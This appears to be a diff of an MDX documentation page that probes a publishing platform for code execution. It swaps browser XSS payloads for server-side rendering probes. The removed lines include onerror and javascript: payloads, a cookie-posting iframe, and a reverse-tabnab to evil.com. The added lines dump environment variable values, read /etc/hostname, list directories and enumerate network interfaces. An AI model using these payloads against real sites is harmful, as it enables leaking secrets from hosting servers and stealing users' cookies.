@@ -4,102 +4,100 @@ subtitle: Testing expression evaluation in published docs
 slug: bypass-tests
 ---
 
-## Test 1: dangerouslySetInnerHTML (React escape hatch)
+## SSR Probe Tests (server-safe — no window/document)
 
-<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+### S1: Basic Arithmetic (SSR-safe)
+{7*7}
 
-## Test 2: JSX event handlers (not HTML attributes)
+### S2: typeof checks
+{typeof process}
 
-<div onClick={() => alert('jsx-onclick')}>Click me - JSX onClick</div>
+### S3: typeof globalThis
+{typeof globalThis}
 
-<button onMouseOver={() => alert('jsx-hover')}>Hover me - JSX onMouseOver</button>
+### S4: typeof require
+{typeof require}
 
-## Test 3: React.createElement
+### S5: typeof module
+{typeof module}
 
-{React.createElement('img', {src: 'https://invalid.test/img.png', onError: () => alert('createElement')})}
+### S6: typeof __dirname
+{typeof __dirname}
 
-## Test 4: Expression in href attribute
+### S7: typeof __filename  
+{typeof __filename}
 
-<a href={'javascript:alert("href-expr")'}>Click - expression href</a>
+### S8: globalThis keys
+{(() => { try { return Object.keys(globalThis).slice(0,10).join(', '); } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 5: Template literal in href
+### S9: process.env (SSR)
+{(() => { try { return typeof process !== 'undefined' ? JSON.stringify(Object.keys(process.env).slice(0,15)) : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-<a href={`javascript:${'alert(1)'}`}>Click - template href</a>
+### S10: process.cwd (SSR)
+{(() => { try { return typeof process !== 'undefined' ? process.cwd() : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 6: Export with side effect
+### S11: process.version
+{(() => { try { return typeof process !== 'undefined' ? process.version : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-export const leak = typeof document !== 'undefined' ? document.cookie : 'ssr'
+### S12: process.platform
+{(() => { try { return typeof process !== 'undefined' ? process.platform : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-Leaked: {leak}
+### S13: process.arch
+{(() => { try { return typeof process !== 'undefined' ? process.arch : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 7: Component with render prop
+### S14: process.pid
+{(() => { try { return typeof process !== 'undefined' ? String(process.pid) : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
 
-{(() => {
-  const el = typeof document !== 'undefined' 
-    ? document.createElement('div') 
-    : null;
-  if (el) el.innerHTML = '<b>DOM-created</b>';
-  return el ? el.innerHTML : 'no-dom';
-})()}
+### S15: hostname via os
+{(() => { try { const os = require('os'); return os.hostname(); } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 8: Markdown HTML block (not JSX)
+### S16: network interfaces
+{(() => { try { const os = require('os'); return JSON.stringify(Object.keys(os.networkInterfaces())); } catch(e) { return 'error: ' + e.message; } })()}
 
-<div>
-<script>alert('markdown-html-block')</script>
-</div>
+### S17: read /etc/hostname
+{(() => { try { const fs = require('fs'); return fs.readFileSync('/etc/hostname', 'utf8').trim(); } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 9: Expression returning JSX
+### S18: list cwd directory
+{(() => { try { const fs = require('fs'); return fs.readdirSync('.').slice(0,10).join(', '); } catch(e) { return 'error: ' + e.message; } })()}
 
-{<img src="https://invalid.test/img.png" onError={() => alert('jsx-return')} />}
+### S19: environment variable dump
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const safe = {}; for (const k of Object.keys(process.env).slice(0,20)) { safe[k] = process.env[k]?.substring(0,50); } return JSON.stringify(safe, null, 2); } catch(e) { return 'error: ' + e.message; } })()}
 
-## Test 10: Ref callback injection
+### S20: fetch from SSR
+{(() => { try { return typeof fetch === 'function' ? 'fetch-available-ssr' : 'no-fetch'; } catch(e) { return 'error: ' + e.message; } })()}
 
-<input ref={(el) => { if(el) el.value = document.cookie }} />
+---
 
-## Test 11: Style with expression
+## Client-safe Tests (won't crash SSR)
 
-<div style={{background: `url('https://example.com/leak?c=${typeof document !== 'undefined' ? 'has-doc' : 'no-doc'}')` }}>Style expression probe</div>
+### C1: Conditional cookie read
+{typeof document !== 'undefined' ? String(document.cookie) : 'ssr-mode'}
 
-## Test 12: Anchor with target and expression
+### C2: Conditional domain read
+{typeof document !== 'undefined' ? String(document.domain) : 'ssr-mode'}
 
-<a href="https://example.com" target="_blank" rel="" onClick={() => {window.opener && window.opener.location.replace('https://evil.com')}}>Reverse tabnab test</a>
+### C3: Export side effect
+export const probe = typeof process !== 'undefined' ? process.env?.NODE_ENV || 'no-env' : 'browser'
 
-## Test 13: SVG with JSX events
+Probe: {probe}
 
-<svg width="100" height="20" onClick={() => alert('svg-jsx-click')}>
-  <rect width="100" height="20" fill="red" />
-  <text x="10" y="15" fill="white">Click SVG</text>
-</svg>
+### C4: dangerouslySetInnerHTML (SSR-safe)
+<div dangerouslySetInnerHTML={{__html: '<b>HTML-injected</b>'}} />
 
-## Test 14: Iframe srcdoc
+### C5: JSX onClick (SSR-safe)
+<button onClick={() => typeof alert !== 'undefined' && alert('click')}>Click test</button>
 
-<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>" />
+### C6: Spread event handler
+<div {...{onMouseEnter: () => typeof alert !== 'undefined' && alert('spread')}}>Hover spread test</div>
 
-## Test 15: Object data URI
+### C7: Expression in href
+<a href={'javascript:void(0)'}>Expression href</a>
 
-<object data="data:text/html,<script>alert('object-data')</script>" type="text/html" width="200" height="50" />
+### C8: Ref callback
+<input ref={(el) => { if(el) el.setAttribute('data-probe', 'ref-worked') }} />
 
-## Test 16: Link stylesheet injection
+### C9: Style with conditional
+<div style={{background: typeof process !== 'undefined' ? 'red' : 'blue'}}>Style conditional (red=SSR, blue=client)</div>
 
-<link rel="stylesheet" href="https://example.com/evil.css" />
-
-## Test 17: Class name expression
-
-<div className={(() => { typeof document !== 'undefined' && (document.title = 'XSS-' + document.domain); return 'test'; })()}>Class expression side effect</div>
-
-## Test 18: Key prop side effect
-
-<div key={(() => { return 'side-effect-key'; })()}>Key prop test</div>
-
-## Test 19: Spread props
-
-<div {...{onMouseEnter: () => alert('spread-event')}}>Spread props hover test</div>
-
-## Test 20: useEffect equivalent via component
-
-{(() => {
-  if (typeof window !== 'undefined') {
-    window.__xss_probe = 'executed-' + document.domain;
-  }
-  return window?.__xss_probe || 'no-window';
-})()}
+### C10: Iframe srcdoc
+<iframe srcdoc="<b>iframe-content</b>" width="200" height="50" />
